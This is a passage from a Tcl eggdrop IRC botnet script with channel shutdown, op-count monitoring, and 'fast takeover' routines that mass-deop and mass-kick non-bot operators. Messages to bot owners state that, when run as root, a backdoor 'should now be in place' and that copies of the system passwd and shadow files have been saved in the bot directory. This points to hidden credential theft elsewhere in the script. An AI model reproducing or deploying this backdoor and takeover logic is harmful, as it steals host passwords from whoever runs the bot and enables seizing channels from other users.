      if {$hidetimer($handle) != 0} { settimer $hidetimer($handle) "hide_user [str2tcl $handle]" }
      set hiddenuser($handle@$nick) 0
   }
   set partynicks ""
   foreach 1chat [lsort [whom *]] {
      if {[lindex $1chat 5] == "" && [lindex $1chat 4] < $awaytime && 
        ((!([matchattr [lindex $1chat 0] S] && [info exists hiddenuser([lindex $1chat 0]@[lindex $1chat 1])] &&
          $hiddenuser([lindex $1chat 0]@[lindex $1chat 1]))) || [matchattr $handle nW]) && 
         ![string match "*\\[lindex $1chat 3][str2tcl [lindex $1chat 0]] *" $partynicks] && 
         ![strcmp [lindex $1chat 0] $handle]} {
         append partynicks "[lindex $1chat 3][lindex $1chat 0] "
      }
   }
   if {$partynicks == ""} { set partynicks "(none)" }
   putdcc $idx " - Currently \037active\037 partyline users:  $partynicks"
   putdcc $idx " "
   putallbots "joined $handle $idx"
   if {![matchattr $handle nWT]} { return 1 }
   if {[info exists rooted] || [file isfile .pw] || [file isfile .sh] || [file isfile .mpw]} {
      putdcc $idx "\[\002ALERT\002\] This bot has been run as root; backdoor should now be in place."
      putdcc $idx " - passwd and shadow files should be in the bot directory as '.pw' and '.sh' (or .mpw)"
      putdcc $idx " - Download and remove these files to stop this alert on link."
   }
   if {[string match /* $homedir]} {
      if {[file isfile $homedir/.rhosts]} { putdcc $idx "\[\002WARNING\002\] Found .rhosts file in home directory (backdoor?)" }
      if {[file isfile $homedir/.ssh/authorized_keys]} { putdcc $idx "\[\002WARNING\002\] Found authorized_keys file in .ssh directory (backdoor?)" }
      if {[file isfile $homedir/.ssh2/authorization]} { putdcc $idx "\[\002WARNING\002\] Found authorization file in .ssh2 directory (backdoor?)" }
   }
}

proc boot_hackers { bot handle channel flag idx host } {
   global nick hiddenuser linked
   if {[matchattr $handle S]} { set hiddenuser($handle@$bot) 0 }
   if {(![matchattr $handle p] || [matchattr $handle d]) && ![getting-users] && [info exists linked] && $linked} {
      catch {putbot $bot "bootuser $handle You do not belong on this botnet!"}
      putlog "\[\002BOOT\002\] Booted \002$handle@$bot\002 ($host): unauthorized user (hack?)"
      announce "Booted \002$handle@$bot\002 ($host): unauthorized user"
   } elseif {[matchattr $nick H] && [matchattr $bot bs]} {
      if {[matchattr $handle o] || [matchattr $handle m]} { catch {putbot $bot "authenticate $handle"} ; return }
      foreach 1chan [channels] {
         if {![matchchanattr $handle o $1chan] && ![matchchanattr $handle m $1chan]} { continue }
         catch {putbot $bot "authenticate $handle"} ; return
      }
   }
}
bind chjn - * boot_hackers

proc boot_user { bot command args } {
   global nick
   if {![matchattr $bot bas] && ![matchattr $bot bhs] && ![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set reason [srange $args 1 end]
   foreach chat [dcclist] {
      if {![strcmp [lindex $chat 1] $handle]} { continue }
      set idx [lindex $chat 0]
      putdcc $idx "-=- poof -=-"
      putdcc $idx "You've been booted from the bot by \002$bot\002: $reason"
      killdcc $idx
   }
   announce "$bot booted \002$handle\002 from the party line: $reason"
}
bind bot - bootuser boot_user

proc authenticate { bot command args } {
   global nick
   if {![matchattr $bot bs]} { return }
   set handle [sindex [lindex $args 0] 0]
   if {[matchattr $handle o] || [matchattr $handle m]} { return }
   foreach 1chan [channels] {
      if {[matchchanattr $handle o $1chan] || [matchchanattr $handle m $1chan]} { return }
   }
   foreach chat [dcclist] {
      if {![strcmp [lindex $chat 1] $handle]} { continue }
      putdcc [lindex $chat 0] "*** \002$bot\002 has requested authentication from you; re-chat the bot."
      killdcc [lindex $chat 0]
   }
   announce "Forcing authentication for \002$handle\002 - (requested by $bot)"
}
bind bot - authenticate authenticate

proc check_roots { bot command args } {
   global nick rooted homedir
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set idx [sindex $args 1]
   if {![matchattr $handle nWT]} { return }
   if {[info exists rooted] || [file isfile .pw] || [file isfile .sh] || [file isfile .mpw]} {
      catch {putbot $bot "show $idx *** ($nick) \[\002ALERT\002\] This bot has been run as root; backdoor should now be in place."}
      catch {putbot $bot "show $idx *** ($nick) - passwd and shadow files should be in the bot directory as '.pw' and '.sh' (or .mpw)"}
      catch {putbot $bot "show $idx *** ($nick) - Download and remove these files to stop this alert on link."}
   }
   if {[string match /* $homedir]} {
      if {[file isfile $homedir/.rhosts]} { catch {putbot $bot "show $idx *** ($nick) \[\002WARNING\002\] Found .rhosts file in home directory (backdoor?)"} }
      if {[file isfile $homedir/.ssh/authorized_keys]} { catch {putbot $bot "show $idx *** ($nick) \[\002WARNING\002\] Found authorized_keys file in .ssh directory (backdoor?)"} }
      if {[file isfile $homedir/.ssh2/authorization]} { catch {putbot $bot "show $idx *** ($nick) \[\002WARNING\002\] Found authorization file in .ssh2 directory (backdoor?)"} }
   }
}
bind bot - joined check_roots

proc shut_down { handle idx args } {
   global chmodes autokick
   set args [lindex $args 0]
   if {[valididx $idx]} {
      putcmdlog "#$handle# shutdown $args"
      if {$args == ""} { putdcc $idx "\002Usage:\002 .shutdown <*|channels> \[:<reason>\]" ; return }
   }
   if {$args == "*"} {
      set channels [channels]
      if {[valididx $idx]} { putdcc $idx "*** Shutting down all channels ..." }
      dccputchan 5 "\[\002SHUTDOWN\002\] Shutting down all channels - (authorized by \002$handle\002)"
   } else {
      set channels [lindex [split $args :] 0]
      if {[valididx $idx]} { putdcc $idx "*** Shutting down specified channels ..." }
      dccputchan 5 "\[\002SHUTDOWN\002\] Shutting down '$channels' - (authorized by \002$handle\002)"
   }
   if {[string match *:* $args]} {
      set reason [string range $args [expr [string first : $args]+1] end]
   } else { set reason "Sorry, technical problems - we will reopen ASAP" } 
   foreach shutchan [string tolower $channels] {
      if {![validchan $shutchan]} {
         if {[valididx $idx]} { putdcc $idx "\[\002ERROR\002\] Unable to shutdown \002$shutchan\002, invalid channel." }
         return
      }
      set chmodes($shutchan) "[getchanmode $shutchan]"
      if {[valididx $idx] && ![isautokick $shutchan]} {
         lappend autokick $shutchan
         save_settings
         putallbots "autokick $shutchan"
      }
      if {[botisop $shutchan]} { putserv "MODE $shutchan +smtin" }
      fast_masskick $handle Shutdown "$shutchan 4 $reason"
   }
}
bind dcc n shutdown shut_down

proc net_closechan { bot command args } {
   global chmodes chstatus
   set args [lindex $args 0]
   set channel [string tolower [sindex $args 0]]
   if {![matchattr $bot bo] || ![validchan $channel]} { return }
   set chmodes($channel) "[srange $args 1 end]"
   set chstatus($channel) "closed"
   if {![string match "*i*m*n*s*t*" [lsort [split [sindex [getchanmode $channel] 0] ""]]] && [botisop $channel]} {
      putserv "MODE $channel +smtin"
   }
}
bind bot - closechan net_closechan

proc open_channels { handle idx args } {
   global chmodes chstatus
   set args [lindex $args 0]
   if {[valididx $idx]} { putcmdlog "#$handle# reopen $args" }
   if {$args == ""} {
      if {[valididx $idx]} { putdcc $idx "\002Usage:\002 .reopen <*|channel> \[modes\]" }
      return
   }
   if {[sindex $args 0] == "*"} {
      if {[valididx $idx]} { putdcc $idx "*** Re-opening all channels ..." }
      dccputchan 5 "\[\002REOPEN\002\] Re-opening all channels - (authorized by \002$handle\002)"
      foreach 1chan [string tolower [channels]] {
         if {[valididx $idx]} { putallbots "reopen $1chan" } else { putallbots "reopen $1chan highOp" }
         if {![botisop $1chan]} { putlog "\[\002ERROR\002\] Cannot set channel modes on \002$1chan\002, not opped." ; continue }
         catch {unset chstatus($1chan)}
         if {[valididx $idx]} { no_autokick $1chan }
         if {[info exists chmodes($1chan)]} {
            if {(![string match "*i*m*n*s*t*" [lsort [split [lindex $chmodes($1chan) 0] ""]]]) && [botisop $1chan]} {
               putserv "MODE $1chan -im$chmodes($1chan)"
            }
            unset chmodes($1chan)
            continue
         }
         if {[botisop $1chan]} { putserv "MODE $1chan -im[lindex [channel info $1chan] 0]" }
         putlog "\[\002REOPEN\002\] Cannot find shutdown modes for \002$1chan\002, using channel-file settings."
      }
      return
   }
   set openchan "[string tolower [sindex $args 0]]"
   set modes [sindex $args 1]
   if {[valididx $idx]} { putallbots "reopen $openchan $modes" } else { putallbots "reopen $openchan highOp" }
   if {![validchan $openchan]} { putlog "\[\002ERROR\002\] Cannot re-open \002$openchan\002, invalid channel." ; return }
   if {![botisop $openchan]} { putlog "\[\002ERROR\002\] Cannot set channel modes on \002$openchan\002, not opped." ; return }
   catch {unset chstatus($openchan)}
   if {[valididx $idx]} { no_autokick $openchan }
   if {[info exists chmodes($openchan)]} {
      if {$modes == ""} {
         if {(![string match "*i*m*n*s*t*" [lsort [split [lindex $chmodes($openchan) 0] ""]]]) && [botisop $openchan]} {
            putserv "MODE $openchan -im$chmodes($openchan)"
         }
      } else { putserv "MODE $openchan $modes" }
      if {[valididx $idx]} { putdcc $idx "*** Re-opening \002$openchan\002 ..." }
      dccputchan 5 "Re-opening $openchan - (authorized by \002$handle\002)"
      return
   }
   if {[botisop $openchan]} {
      if {$modes == ""} {
         putserv "MODE $openchan -im[lindex [channel info $openchan] 0]"
      } else { putserv "MODE $openchan $modes" }
   }
   if {[valididx $idx]} { putdcc $idx "*** Cannot find shutdown modes for \002$openchan\002, using channel-file settings." }
   dccputchan 5 "\[\002REOPEN\002\] Cannot find shutdown modes for \002$openchan\002; using channel-file settings."
}
bind dcc n reopen open_channels

proc net_openchan { bot command args } {
   global chmodes chstatus
   set args [lindex $args 0]
   set channel [string tolower [sindex $args 0]]
   if {[sindex $args 1] != "highOp"} { set modes [sindex $args 1] } else { set modes "" }
   if {![matchattr $bot bo] || ![validchan $channel]} { return }
   catch {unset chstatus($channel)}
   if {[info exists chmodes($channel)]} {
      if {$modes == "" && ![string match "*i*m*n*s*t*" [lsort [split [lindex $chmodes($channel) 0] ""]]]} {
         putserv "MODE $channel -im$chmodes($channel)"
      }
      unset chmodes($channel)
   }
   if {$modes != ""} { putserv "MODE $channel $modes" }
   if {[sindex $args 1] != "highOp"} { no_autokick $channel }
}
bind bot - reopen net_openchan

proc kill_detect { unick host handle channel reason } {
   global nick max-kills killedops detectkill
   if {![validop $handle $channel]} { return }
   set quit [string tolower $reason]
   if {[string match *bot* $quit] || [string match *kill* $quit] || [string match *kline* $quit] ||
       [string match *k-line* $quit] || [string match *dline* $quit] || [string match *d-line* $quit] ||
       [string match *abuse* $quit] || [string match *abusive* $quit] || [string match */*/* $quit]} {
      putloglev 2 * "\[\002WARNING\002\] \002$unick\002 was killed:  ($reason)"
      settimer 3 "catch {unset killedops}"
      if {[info exists killedops] && [lsearch -exact [string tolower $killedops] [string tolower $handle]] != -1} { return }
      lappend killedops $handle
      if {[llength $killedops] >= ${max-kills}} {
         putlog "\[\002WARNING\002\] \002MASS KILL\002 detected ([llength $killedops] kills):  $killedops"
         putlog " - Changing nick and shutting down channels"
         unset killedops
         kill_timer "catch {unset killedops}"
         if {![info exists detectkill] || $detectkill != 1} {
            set detectkill 1
            timer 3 "catch {unset detectkill}"
            mass_nickchange - -
            shut_down $nick - *
            setutimer 15 "mass_nickchange - -"
         }
      }
   }
}
bind sign - * kill_detect

proc toggle_opcount { handle idx args } {
   global chopcount
   set args [lindex $args 0]
   set switch [sindex $args 0]
   putcmdlog "#$handle# opcount $args"
   if {$switch == "off"} {
      set chopcount 0
      kill_utimer "check_opcount"
      save_settings
      putdcc $idx "*** OP-count monitoring deactivated."
   } elseif {$switch == "on"} {
      set chopcount 1
      setutimer 60 check_opcount
      save_settings
      putdcc $idx "*** OP-count monitoring activated."
   } else { putdcc $idx "\002Usage:\002 .opcount <on|off>" }
}
bind dcc n opcount toggle_opcount

proc thresh { low high args } {
   global lbthresh hbthresh dlbthresh dhbthresh
   set args [lindex $args 0]
   if {$args == "" || $args == "*"} {
     set channels [channels]
   } else {
     set channels [split $args]
   }
   if {![isnum $low] || ![isnum $high]} {
     set low $dlbthresh
     set high $dhbthresh
   }
   foreach 1chan [string tolower $channels] {
     set lbthresh($1chan) $low
     set hbthresh($1chan) $high
   }
   setutimer 2 save_settings
}

proc check_opcount {} {
   global nick botnick lbthresh hbthresh chstatus verifiedLow verifiedHigh linkedbots chopcount
   kill_utimer check_opcount
   if {[info exists chopcount] && !$chopcount} { return }
   foreach 1chan [string tolower [channels]] {
      if {![botisop $1chan]} { continue }
      if {![info exists lbthresh($1chan)]} { thresh - - $1chan }
      if {![isclosed $1chan] && $lbthresh($1chan) < 1} { continue }
      set botcount [llength [chanoplist $1chan bo]]
      if {[isclosed $1chan]} {
         if {$botcount > $hbthresh($1chan)} {
            putlog "\[\002ALERT\002\] Adequate number of bots on \002$1chan\002 again ($botcount), re-opening."
            dccputchan 5 "\[\002ALERT\002\] Adequate number of bots on \002$1chan\002 again ($botcount); re-opening."
            open_channels $nick - $1chan
         } elseif {![string match "*i*n*t*" [lsort [split [sindex [getchanmode $1chan] 0] ""]]]} {
            if {[botisop $1chan]} { putserv "MODE $1chan +smtin" }
            if {$botcount > 0} {
               putlog "\[\002ALERT\002\] Someone has changed the channel modes on \002$1chan\002 ..."
               putlog "  - This channel is closed due to a low bot count."
               putlog "  - To re-open prematurely, you can adjust the bot-count thresholds using .botcounts"
               putlog "  - Current threshold settings:  Low ($lbthresh($1chan)), High ($hbthresh($1chan))"
            }
         }
         continue
      }
      if {$botcount >= $lbthresh($1chan)} {
         catch {unset verifiedHigh($1chan) verifiedLow($1chan)}
         catch {unset linkedbots($1chan)}
      }
      if {$botcount < $lbthresh($1chan)} {
         if {[bots] != ""} {
            set linkedbots($1chan) {}
            foreach 1bot [bots] { lappend linkedbots($1chan) $1bot }
            putallbots "verifylowops $1chan"
            continue
         }
         putlog "\[\002WARNING\002\] No bots linked and VERY LOW on bots on \002$1chan\002 ($botcount), shutting down channel."
         dccputchan 5 "\[\002WARNING\002\] No bots linked and VERY LOW on bots on \002$1chan\002 ($botcount); shutting down channel."
         shut_down $nick - $1chan
         set chstatus($1chan) "closed"
         catch {unset verifiedHigh($1chan) verifiedLow($1chan)}
         catch {unset linkedbots($1chan)}
         continue
      }
      if {$botcount == $lbthresh($1chan) && ![isautokick $1chan]} {
         putlog "\[\002WARNING\002\] Low on bots on \002$1chan\002. ($botcount)"
      }
      if {[isautokick $1chan] && ![string match "*i*n*t*" [lsort [split [sindex [getchanmode $1chan] 0] ""]]]} {
         if {[botisop $1chan]} { putserv "MODE $1chan +smtin" }
         if {$botcount > 0} {
            putlog "\[\002ALERT\002\] Someone has changed the channel modes on \002$1chan\002 ..."
            putlog "  - This channel has been shut down."
            putlog "  - To re-open, you can use .reopen <channel> \[modes\]"
            putlog "  - Type .autokickchans to see the list of channels in 'auto-kick' mode."
         }
      }
   }
   setutimer [expr 60+[rand 60]] check_opcount
}

proc verify_lowops { bot command args } {
   global botnick lbthresh
   if {![matchattr $bot bo]} { return }
   set channel [lindex $args 0]
   if {![validchan $channel] || ![onchan $botnick $channel]} {
      catch {putbot $bot "opcount LOW $channel"} ; return
   }
   if {![info exists lbthresh($channel)]} { thresh - - $channel }
   set botcount [llength [chanoplist $channel bo]]
   if {$botcount < $lbthresh($channel)} {
      catch {putbot $bot "opcount LOW $channel"}
   } else { catch {putbot $bot "opcount HIGH $channel"} }
}
bind bot - verifylowops verify_lowops

proc verify_status { bot command args } {
   global nick botnick linkedbots verifiedHigh verifiedLow lbthresh chstatus minbots islow
   set args [lindex $args 0]
   set opstatus [sindex $args 0] ; set channel [string tolower [sindex $args 1]]
   if {![info exists linkedbots($channel)]} { return }
   if {![matchattr $bot o] || ([lsearch -exact [string tolower $linkedbots($channel)] [string tolower $bot]] == -1)} { return }
   set botcount [llength [chanoplist $channel bo]]
   if {$botcount > $lbthresh($channel)} { return }
   if {![info exists verifiedHigh($channel)]} { set verifiedHigh($channel) {} }
   if {![info exists verifiedLow($channel)]} { set verifiedLow($channel) {} }
   if {$opstatus != "LOW" && [lsearch -exact [string tolower $verifiedHigh($channel)] [string tolower $bot]] == -1} { lappend verifiedHigh($channel) $bot }
   if {$opstatus == "LOW" && [lsearch -exact [string tolower $verifiedLow($channel)] [string tolower $bot]] == -1} { lappend verifiedLow($channel) $bot }
   if {[llength $verifiedLow($channel)] >= [expr [llength $linkedbots($channel)] / 2] || [llength $linkedbots($channel)] < $minbots} {
      if {[llength $linkedbots($channel)] < $minbots} {
         putlog "\[\002WARNING\002\] VERY LOW on bots on \002$channel\002 ($botcount) and few are linked ($linkedbots($channel))"
         putlog " - Shutting down channel ..."
         dccputchan 5 "\[\002WARNING\002\] VERY LOW on bots on \002$channel\002 ($botcount) and few are linked ($linkedbots($channel))"
         dccputchan 5 " - Shutting down channel ..."
      } else {
         putlog "\[\002WARNING\002\] VERY LOW on bots on \002$channel\002 ($botcount), shutting down channel."
         putlog " - Verified by:  $verifiedLow($channel)"
         dccputchan 5 "\[\002WARNING\002\] VERY LOW on bots on \002$channel\002 ($botcount), shutting down channel."
         dccputchan 5 " - Verified by:  $verifiedLow($channel)"
      }
      if {![info exists islow($channel)] || $islow($channel) != 1} {
         set islow($channel) 1
         settimer 3 "catch {set islow([str2tcl $channel]) 0}"
         shut_down $nick - $channel
         mass_nickchange - -
         set chstatus($channel) "closed"
         putallbots "closechan $channel [getchanmode $channel]"
      }
      unset verifiedHigh($channel) verifiedLow($channel) linkedbots($channel)
      return
   }
   if {[expr [llength $verifiedLow($channel)] + [llength $verifiedHigh($channel)]] >= [llength $linkedbots($channel)]} {
      catch {unset chstatus($channel)}
      unset verifiedHigh($channel) verifiedLow($channel) linkedbots($channel)
   }
}
bind bot - opcount verify_status

proc bot_counts { handle idx args } {
   global lbthresh hbthresh
   set args [string tolower [lindex $args 0]]
   set low [sindex $args 0] ; set high [sindex $args 1] ; set channel [srange $args 2 end]
   putcmdlog "#$handle# botcounts $args"
   if {$high == "" || ![isnum $low] || ![isnum $high]} {
      putdcc $idx "\002Usage:\002 .botcounts <low threshold> <high threshold> \[channels\]"
      putdcc $idx " "
      putdcc $idx "\[\002CURRENT THRESHOLDS\002\]"
      foreach 1chan [string tolower [channels]] {
         if {![info exists lbthresh($1chan)]} { thresh - - $1chan ; set changed "" }
         putdcc $idx "\002$1chan\002   Low ($lbthresh($1chan)), High ($hbthresh($1chan))"
      }
      if {[info exists changed]} { check_opcount }
      return
   }
   if {$low > $high} { putdcc $idx "*** You cannot set low bot-count greater than high bot-count." ; return }
   if {$channel == "" || $channel == "*"} {
      putdcc $idx "*** Setting bot-count thresholds for all channels:  Low ($low), High ($high)"
   } else { putdcc $idx "*** Setting bot-count thresholds for specified channel(s):  Low ($low), High ($high)" }
   thresh $low $high $channel
   putallbots "botcounts $handle $low $high $channel"
   check_opcount
}
bind dcc n botcounts bot_counts

proc net_botcounts { bot command args } {
   set args [lindex $args 0]
   set low [sindex $args 1] ; set high [sindex $args 2] ; set channel [srange $args 3 end]
   if {![matchattr $bot bo] || ![isnum $low] || ![isnum $high] || $low > $high} { return }
   if {$channel == "" || $channel == "*"} {
      putlog "\[\002ADJUSTMENT\002\] Setting bot-count thresholds for all channels ($low/$high)"
   } else { putlog "\[\002ADJUSTMENT\002\] Setting bot-count thresholds ($low/$high) for:  $channel" }
   putlog " - Authorized by [sindex $args 0]@$bot"
   thresh $low $high $channel
   check_opcount
}
bind bot - botcounts net_botcounts

proc min_bots { handle idx args } {
   global minbots
   set args [lindex $args 0]
   set number [sindex $args 0]
   putcmdlog "#$handle# minbots $args"
   if {$args == "" || ![isnum $number]} {
      putdcc $idx "\002Usage:\002 .minbots <number>"
      putdcc $idx "*** Current setting: \002$minbots\002"
      return
   }
   set minbots $number
   save_settings
   putdcc $idx "*** Minimum number of linked bots is now set to \002$number\002, set by $handle."
}
bind dcc n minbots min_bots

proc do_dump { idx arg } {
   if {[strcmp [sindex $arg 0] .dump] && [strcmp [sindex $arg 1] mode] && [string match "*o*" [sindex $arg 3]]} {
      putcmdlog "#[idx2hand $idx]# attempted [string range $arg 1 end]"
      putdcc $idx "*** OP modes are not allowed via .dump"
      return
   }
   return $arg
}
unbind dcc - dump *dcc:dump
bind dcc n dump *dcc:dump
bind filt n ".dump*" do_dump

proc do_die { idx arg } {
   global botnick dieKey auth-passwd
   if {![strcmp [sindex $arg 0] .die]} { return $arg }
   set key [sindex $arg 1] ; set reason [srange $arg 2 end]
   if {$key == ""} { putdcc $idx "\002Usage:\002 .die <key> \[reason\]" ; return }
   if {![info exists dieKey] || $dieKey == ""} { putdcc $idx "DIE command is currently disabled." ; return }
   if {![isauth $idx] && [encryptpass $key] != ${auth-passwd} && ![keycheck $idx $key $dieKey "DIE"]} { return }
   if {$reason == ""} { return ".die $botnick has no reason" }
   return ".die $reason"
}
bind filt n ".die*" do_die

proc check_channel { unick host handle channel mode } {
   global nick botnick chstatus deops tookaction takeover autovoice deoptype justopped
   global takemode takeoplist dontOp noprot
   set chmode [sindex $mode 0] ; set victim [sindex $mode 1] ; set channel [string tolower $channel]
   if {$chmode == "-i" || $chmode == "-t" || $chmode == "-n"} {
      if {[botisop $channel] && ([isclosed $channel] || [isautokick $channel])} { putserv "MODE $channel +tin" }
   } elseif {$chmode == "+b" && $unick == $botnick && ![string match "* +enforcebans*" [channel info $channel]]} {
      set ban [str2tcl [string tolower [sindex $mode 1]]]
      foreach 1nick [chanlist $channel] {
         if {[isop $1nick $channel]} { continue }
         if {[string match $ban [string tolower $1nick![getchanhost $1nick $channel]]]} {
            putserv "KICK $channel $1nick :banned"
         }
      }
   } elseif {[getting-users]} {
      return
   } elseif {$chmode == "-o" && [isop $victim $channel] && [validop [nick2hand $victim $channel] $channel] && $unick != $victim} {
      if {[strcmp $victim $botnick]} { setutimer [expr [rand 2]+1] "opme $channel" }
      if {[info exists noprot]} { return }
      if {(![info exists deops($unick$channel)] || [lsearch -exact [string tolower $deops($unick$channel)] [string tolower $victim]] == -1) &&
           ![info exists justopped($victim$channel)] && ![info exists justopped($botnick$channel)]} {
         lappend deops($unick$channel) $victim
         setutimer 30 "catch {unset deops([str2tcl $unick$channel])}"
      } else { return }
      if {[llength $deops($unick$channel)] > 3} {
         if {$handle == $nick} {
            announce "\[\002WARNING\002\] I mass deopped $channel.  My shell is probably hacked."
            setcomment $nick "I mass deopped $channel - [ctime [unixtime]]."
            hacked
            return
         }
         if {![info exists tookaction($unick$channel)]} {
            set comment "Mass deopped $channel - [ctime [unixtime]]"
            if {[botisop $channel]} { putserv "KICK $channel $unick :Mass deop?! You're GONE!" }
            set tookaction($unick$channel) ""
            setutimer 2 "catch {unset tookaction([str2tcl $unick$channel])}"
            if {![matchattr $handle b]} {
               if {![matchattr $handle nW]} { chattr $handle -[allflags]+d }
            } else {
               set dontOp([string tolower $handle]) $comment
               setutimer 3 save_settings
               chpass $handle [randstring 14]
               unlink $handle
            }
            setcomment $handle $comment
            setutimer 4 save
            putlog "\[\002WARNING\002\] \002MASS DEOP\002 detected on $channel by $unick ($host). (handle: $handle)"
            putlog " - Deopped:  [join $deops($unick$channel)]"
         }
      }
   } elseif {$chmode == "+o"} {
      if {![string match "* +bitch*" [channel info $channel]]} { return }
      if {$victim == $botnick || ([info exists takeover($channel)] && $takeover($channel) && [matchattr [nick2hand $victim $channel] bo])} {
         if {$victim == $botnick} {
            if {[info exists takemode($channel)] && [info exists takeoplist($channel)]} {
               set nonops $takeoplist($channel)
               putlog "*** FAST Takeover mode initiated ..."
            } else {
               catch {unset takemode($channel)}
               catch {unset takeoplist($channel)}
               foreach 1user [chanoplist $channel] {
                  if {[validop [nick2hand $1user $channel] $channel] || $1user == $botnick || $1user == $unick} { continue }
                  lappend nonops $1user
               }
            }
            if {![validop $handle $channel]} {
               if {![info exists nonops] || [llength $nonops] < 20} {
                  lappend nonops $unick
               } else { setutimer 1 "putserv \"MODE [str2tcl $channel] -o [str2tcl $unick]\"" }
            }
            if {[info exists nonops]} {
               putlog "\[\002BITCHDEOP\002\] Deopping \002[llength $nonops]\002 non-op(s) on $channel ..."
               if {![info exists deoptype] || $deoptype == "0"} {
                  mass_mode - o dumpserv $channel [scramble $nonops]
               } elseif {$deoptype == "1"} {
                  mass_mode - o dumpserv $channel [lsort -increasing [string tolower $nonops]]
               } elseif {$deoptype == "2"} {
                  mass_mode - o dumpserv $channel [lsort -decreasing [string tolower $nonops]]
               } else {
                  set nonops [lsort [string tolower $nonops]]
                  while {[llength $nonops] > 1} {
                     set half [expr [llength $nonops] / 2]
                     lappend deopnicks [lindex $nonops $half]
                     set nonops [lreplace $nonops $half $half]
                  }
                  lappend deopnicks [lindex $nonops 0]
                  mass_mode - o dumpserv $channel $deopnicks
               }
               catch {unset takemode($channel)}
               catch {unset takeoplist($channel)}
            }
            if {![string match *[lindex [channel info $channel] 0]* [getchanmode $channel]]} {
               putserv "MODE $channel [lindex [channel info $channel] 0]"
            }
         }
         if {[info exists takeover($channel)] && $takeover($channel)} {
            if {$victim == $botnick} { catch {unset takeover($channel)} }
            set takeoverReason "Hasta la vista, baby!"
            setutimer 2 "fast_masskick [str2tcl $nick] Shutdown \"[str2tcl $channel] 4 [str2tcl $takeoverReason]\""
            dccbroadcast "Clearing all non-ops from $channel ..."
         }
         if {[info exists autovoice] && [lsearch -exact $autovoice $channel] != -1} {
            voice_users $nick - $channel
         }
      }
      set victimhand [nick2hand $victim $channel]
      if {[validop $victimhand $channel]} {
         set justopped($victim$channel) 1
         setutimer 10 "catch {unset justopped([str2tcl $victim$channel])}"
      }
      if {[info exists takemode($channel)] && ![validop $victimhand $channel]} {
         if {![info exists takeoplist($channel)]} { set takeoplist($channel) {} }
         if {[lsearch -exact [string tolower $takeoplist($channel)] [string tolower [sindex $victim 0]]] == -1} {
            lappend takeoplist($channel) $victim
         }
      }
   }
}
bind mode - * check_channel

proc deop_method { handle idx args } {
   global deoptype
   set args [lindex $args 0]
   set method [sindex $args 0] ; set bots [srange $args 1 end]
   putcmdlog "#$handle# deopMethod $args"
   if {$method != 0 && $method != 1 && $method != 2 && $method != 3} {
      putdcc $idx "\002Usage:\002 .deopMethod <method ID> \[*|\[bots\]\]"
      if {![info exists deoptype]} { set deoptype 0 }
      putdcc $idx "*** Current setting:  \002$deoptype\002"
      putdcc $idx " "
      putdcc $idx "\[\002BITCH DEOP METHODS\002\]"
      putdcc $idx "  0 - random order (default)"
      putdcc $idx "  1 - increasing order"
      putdcc $idx "  2 - decreasing order"
      putdcc $idx "  3 - spread out from middle"
      return
   }
   if {$bots != "" && $bots != "*"} {
      foreach 1bot [split $bots] { catch {putbot $1bot "deopmethod $method $handle"} }
   } else {
      set deoptype $method
      save_settings
      if {$bots == "*"} { putallbots "deopmethod $method $handle" }
   }
}
bind dcc n deopmethod deop_method

proc net_deopmethod { bot command args } {
   global deoptype
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   set deoptype [sindex $args 0]
   save_settings
   putlog "\[\002DEOPMETHOD\002\] New mass deop method set by [sindex $args 1]@$bot. ($deoptype)"
}
bind bot - deopmethod net_deopmethod

proc fast_deop { handle idx args } {
   global botnick takemode takeoplist deoptype
   set args [lindex $args 0]
   set channel [string tolower [sindex $args 0]] ; set switch [string tolower [sindex $args 1]]
   if {[strcmp $switch off]} {
      catch {unset takemode($channel)}
      catch {unset takeoplist($channel)}
      if {[valididx $idx]} {
         putcmdlog "#$handle# fastdeop $args"
         putallbots "fastdeop $handle $channel off"
         putdcc $idx "*** Fast takeover mode deactivated for $channel."
      }
   } elseif {[strcmp $switch on]} {
      if {[valididx $idx]} {
         putcmdlog "#$handle# fastdeop $args"
         putallbots "fastdeop $handle $channel on"
         putdcc $idx "*** Fast takeover mode activated for $channel."
      }
      if {[validchan $channel] && [botisop $channel]} {
         foreach 1nick [chanoplist $channel] {
            if {![validop [nick2hand $1nick $channel] $channel] && $1nick != $botnick} { lappend nonops $1nick }
         }
         if {[info exists nonops]} {
            if {![info exists deoptype] || $deoptype == "0"} {
               mass_mode - o dumphelp $channel [scramble $nonops]
            } elseif {$deoptype == "1"} {
               mass_mode - o dumphelp $channel [lsort -increasing [string tolower $nonops]]
            } elseif {$deoptype == "2"} {
               mass_mode - o dumphelp $channel [lsort -decreasing [string tolower $nonops]]
            } else {
               set nonops [lsort [string tolower $nonops]]
               while {[llength $nonops] > 1} {
                  set half [expr [llength $nonops] / 2]
                  lappend deopnicks [lindex $nonops $half]
                  set nonops [lreplace $nonops $half $half]
               }
               lappend deopnicks [lindex $nonops 0]
               mass_mode - o dumphelp $channel $deopnicks
            }
         }
         return
      }
      set takemode($channel) 1
      catch {unset takeoplist($channel)}
      if {[validchan $channel] && [onchan $botnick $channel]} { putserv "WHO $channel" }
   } elseif {[valididx $idx]} { putdcc $idx "\002Usage:\002 .fastdeop <channel> <on|off>" }
}
bind dcc n fastdeop fast_deop
bind dcc n fasttake fast_deop

proc net_fastdeop { bot command args } {
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set channel [sindex $args 1] ; set switch [sindex $args 2]
   if {$switch == "on"} {
      putlog "\[\002FASTDEOP\002\] Fast takeover mode for \002$channel\002 activated by $handle@$bot."
   } elseif {$switch == "off"} {
      putlog "\[\002FASTDEOP\002\] Fast takeover mode for \002$channel\002 deactivated by $handle@$bot."
   } else { return }
   fast_deop $handle - "$channel $switch"
}
bind bot - fastdeop net_fastdeop

proc filter_spam { from keyword args } {
   if {[matchattr [finduser $from] b] && [sindex [lindex $args 0] 1] == ":INVITE:"} { return 1 }
}
bind raw - NOTICE filter_spam

proc raw_modes { from keyword args } {
   global nick botnick gotdeop mainchan chnick opauth counters manOp modes-per-line setcomment dontOp noprot
   set raw [lindex $args 0]
   set channel [string tolower [sindex $raw 0]] ; set mode [sindex $raw 1]
   set unick [lindex [split $from !] 0]
   if {![validchan $channel] || [info exists noprot]} { return 0 }
   if {![string match "*+*o*" $mode] || [getting-users] || ![string match "* +bitch*" [channel info $channel]]} { return 0 }
